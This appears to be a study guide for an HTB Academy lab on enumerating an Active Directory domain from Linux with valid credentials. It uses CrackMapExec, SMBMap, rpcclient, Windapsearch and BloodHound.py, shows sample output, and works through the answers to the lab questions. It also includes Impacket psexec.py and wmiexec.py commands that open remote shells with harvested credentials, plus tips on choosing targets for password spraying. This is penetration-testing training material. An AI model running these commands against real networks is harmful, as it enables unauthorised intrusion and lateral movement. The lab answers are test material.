# Credentialed Enumeration - from Linux

## 📋 Overview

After gaining initial access and valid domain credentials, the next phase involves deep enumeration of the Active Directory environment. This comprehensive enumeration focuses on gathering detailed information about domain users, computers, groups, Group Policy Objects, permissions, ACLs, trusts, and attack paths using various Linux-based tools.

## 🎯 Prerequisites

### 🔑 **Required Credentials**
- **Valid domain user credentials** (any permission level)
- **Cleartext password**, **NTLM hash**, or **SYSTEM access** on domain-joined host
- **Minimum privilege**: Standard domain user account

### 🛠️ **Key Tools Covered**
- **CrackMapExec (CME)**: Multi-protocol enumeration and exploitation
- **SMBMap**: SMB share enumeration and interaction
- **rpcclient**: RPC-based enumeration and manipulation
- **Impacket**: Python toolkit for Windows protocol interaction
- **Windapsearch**: LDAP-based domain enumeration
- **BloodHound.py**: AD attack path visualization data collection

---

## 🔨 CrackMapExec (CME)

### 📝 **Overview**
CrackMapExec (now NetExec) is a powerful multi-protocol toolkit that leverages Impacket and PowerSploit packages for comprehensive AD assessment. It supports MSSQL, SMB, SSH, and WinRM protocols.

### 🔍 **Basic Syntax and Options**
```bash
# Basic CME help
crackmapexec -h

# SMB protocol options
crackmapexec smb -h

# Key flags for domain enumeration:
-u USERNAME     # User credentials to authenticate
-p PASSWORD     # User's password  
--users         # Enumerate domain users
--groups        # Enumerate domain groups
--loggedon-users # Enumerate logged-on users
--shares        # Enumerate available shares
--pass-pol      # Enumerate password policy
```

### 👥 **Domain User Enumeration**
```bash
# Enumerate all domain users with detailed information
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```

**Example Output Analysis:**
```bash
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-03-29 12:29:14.476567
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2022-04-09 23:04:58.611828
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\htb-student                    badpwdcount: 0 baddpwdtime: 2022-03-30 16:27:41.960920
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez                       badpwdcount: 3 baddpwdtime: 2022-02-24 18:10:01.903395
```

**🎯 Key Information:**
- **badpwdcount**: Failed password attempts (useful for password spraying target lists)
- **baddpwdtime**: Last failed authentication timestamp
- **Account status**: Active vs disabled accounts

### 🏷️ **Domain Group Enumeration**
```bash
# Enumerate all domain groups and membership counts
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```

**Example Output:**
```bash
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain group(s)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Administrators                           membercount: 3
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Users                                    membercount: 4
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Guests                                   membercount: 2
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Backup Operators                         membercount: 1
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Admins                            membercount: 19
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Users                             membercount: 0
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Contractors                              membercount: 138
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Accounting                               membercount: 15
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Engineering                              membercount: 19
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Executives                               membercount: 10
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Human Resources                          membercount: 36
```

**🔍 Groups of Interest:**
- **Domain Admins**: Highest privilege group
- **Backup Operators**: Backup and restore privileges
- **Executives**: High-value targets
- **Engineering/IT groups**: Technical privileges

### 👨‍💻 **Logged-On Users Enumeration**
```bash
# Check what users are currently logged into target hosts
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```

**Example Output:**
```bash
SMB         172.16.5.130    445    ACADEMY-EA-FILE  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-FILE) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 (Pwn3d!)
SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] Enumerated loggedon users
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\clusteragent              logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\lab_adm                   logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\svc_qualys                logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\wley                      logon_server: ACADEMY-EA-DC01
```

**💎 Key Observations:**
- **(Pwn3d!)**: forend is local admin on this host
- **Multiple admin users**: lab_adm, svc_qualys logged in
- **High-value targets**: Domain admin users active on file server

### 📁 **Share Enumeration**
```bash
# Enumerate available shares and permissions
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```

**Example Output:**
```bash
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated shares
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Share           Permissions     Remark
SMB         172.16.5.5      445    ACADEMY-EA-DC01  -----           -----------     ------
SMB         172.16.5.5      445    ACADEMY-EA-DC01  ADMIN$                          Remote Admin
SMB         172.16.5.5      445    ACADEMY-EA-DC01  C$                              Default share
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Department Shares READ            
SMB         172.16.5.5      445    ACADEMY-EA-DC01  IPC$            READ            Remote IPC
SMB         172.16.5.5      445    ACADEMY-EA-DC01  NETLOGON        READ            Logon server share 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  SYSVOL          READ            Logon server share 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  User Shares     READ            
SMB         172.16.5.5      445    ACADEMY-EA-DC01  ZZZ_archive     READ 
```

### 🕷️ **Share Content Spidering**
```bash
# Use spider_plus module to crawl share contents
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'

# Check results
head -n 10 /tmp/cme_spider_plus/172.16.5.5.json 
```

**Example JSON Output:**
```json
{
    "Department Shares": {
        "Accounting/Private/AddSelect.bat": {
            "atime_epoch": "2022-03-31 14:44:42",
            "ctime_epoch": "2022-03-31 14:44:39",
            "mtime_epoch": "2022-03-31 15:14:46",
            "size": "278 Bytes"
        }
    }
}
```

---

## 🗂️ SMBMap

### 📝 **Overview**
SMBMap specializes in SMB share enumeration, providing detailed share listings, permissions, and content exploration capabilities.

### 🔍 **Basic Share Access Check**
```bash
# Check share access and permissions
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```

### 📂 **Recursive Directory Listing**
```bash
# Recursive listing of directories in specific share
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

---

## 📞 rpcclient

### 📝 **Overview**
rpcclient leverages MS-RPC functionality to enumerate, modify, and interact with AD objects. It supports both authenticated and unauthenticated (NULL session) enumeration.

### 🔓 **Establishing Connection**
```bash
# Authenticated connection
rpcclient -U "INLANEFREIGHT.LOCAL\forend%Klmcargo2" 172.16.5.5

# NULL session (if allowed)
rpcclient -U "" -N 172.16.5.5
```

### 👥 **User Enumeration**
```bash
# List all domain users with RIDs
rpcclient $> enumdomusers

# Example output:
user:[administrator] rid:[0x1f4]
user:[guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[lab_adm] rid:[0x3e9]
user:[htb-student] rid:[0x457]
```

### 🔍 **User Information by RID**
```bash
# Query specific user by RID (hex)
rpcclient $> queryuser 0x457
```

### 📊 **RID and SID Understanding**
```bash
# RID (Relative Identifier) Examples:
# Administrator: RID 0x1f4 (500 decimal) - Always the same
# Domain Users: RID 0x201 (513 decimal) - Standard group
# Domain Admins: RID 0x200 (512 decimal) - Admin group

# Full SID format: S-1-5-21-<domain-identifier>-<RID>
# Example: S-1-5-21-3842939050-3880317879-2865463114-1111
```

---

## 🐍 Impacket Toolkit

### 📝 **Overview**
Impacket provides Python-based tools for interacting with Windows protocols. Two key tools are psexec.py and wmiexec.py.

### ⚡ **psexec.py**
```bash
# Establish SYSTEM-level shell via service creation
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
```

### 🎯 **wmiexec.py**
```bash
# Semi-interactive shell via WMI
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```

---

## 🔍 Windapsearch

### 📝 **Overview**
Windapsearch is a Python script for LDAP-based enumeration of users, groups, and computers.

### 👑 **Domain Admins Enumeration**
```bash
# Enumerate Domain Admins group members
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```

### 🎯 **Privileged Users (Nested Groups)**
```bash
# Find all privileged users via recursive group membership
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

---

## 🩸 BloodHound.py

### 📝 **Overview**
BloodHound.py is the Python ingestor for BloodHound, collecting AD data for attack path visualization.

### 🚀 **Data Collection**
```bash
# Collect all available data
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```

### 📁 **Output Files**
```bash
# Generated JSON files
20220307163102_computers.json
20220307163102_domains.json  
20220307163102_groups.json
20220307163102_users.json

# Create zip for BloodHound GUI upload
zip -r ilfreight_bh.zip *.json
```

---

## 🎯 HTB Academy Lab Solutions

### 📝 **Lab Questions & Solutions**

#### 🔍 **Question 1: "What AD User has a RID equal to Decimal 1170?"**

**Solution Process:**
```bash
# Step 1: Convert decimal 1170 to hex
python3 -c "print(hex(1170))"
# Output: 0x492

# Step 2: Use rpcclient to query the RID
rpcclient -U "INLANEFREIGHT.LOCAL\forend%Klmcargo2" 172.16.5.5
rpcclient $> queryuser 0x492

# Step 3: Identify the username from output
# Alternative: enumerate all users and filter
rpcclient $> enumdomusers | grep 0x492
```

#### 👥 **Question 2: "What is the membercount: of the 'Interns' group?"**

**Solution Process:**
```bash
# Method 1: Using CrackMapExec
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups | grep -i interns

# Method 2: Using rpcclient
rpcclient -U "INLANEFREIGHT.LOCAL\forend%Klmcargo2" 172.16.5.5
rpcclient $> enumdomgroups | grep -i interns
# Note the RID, then:
rpcclient $> querygroup [RID_OF_INTERNS_GROUP]
```

---

## ⚡ Quick Reference Commands

### 🔧 **Essential One-Liners**
```bash
# Quick domain user count
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users | grep -c "INLANEFREIGHT.LOCAL"

# Find Domain Admin count
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups | grep "Domain Admins" | awk '{print $NF}'

# RID to hex conversion
python3 -c "print(hex(1170))"  # Converts decimal to hex for rpcclient
```

---

## 🔑 Key Takeaways

### ✅ **Critical Success Factors**
- **Valid credentials are essential** - Even low-privilege domain user accounts unlock extensive enumeration
- **Multiple tools provide different perspectives** - Use complementary tools for comprehensive coverage
- **Save all output to files** - Essential for analysis, correlation, and reporting
- **Focus on privileged groups** - Domain Admins, Enterprise Admins, Backup Operators, etc.

### 🎯 **Strategic Priorities**
1. **User enumeration** - Identify high-value targets and service accounts
2. **Group membership analysis** - Understand privilege relationships
3. **Share exploration** - Find sensitive data and configuration files
4. **Session hunting** - Locate privileged users on accessible systems
5. **Attack path visualization** - Use BloodHound for strategic planning

---

*Credentialed enumeration from Linux provides powerful capabilities for AD assessment - with valid credentials, even low-privilege accounts can reveal extensive domain intelligence for strategic attack planning.*
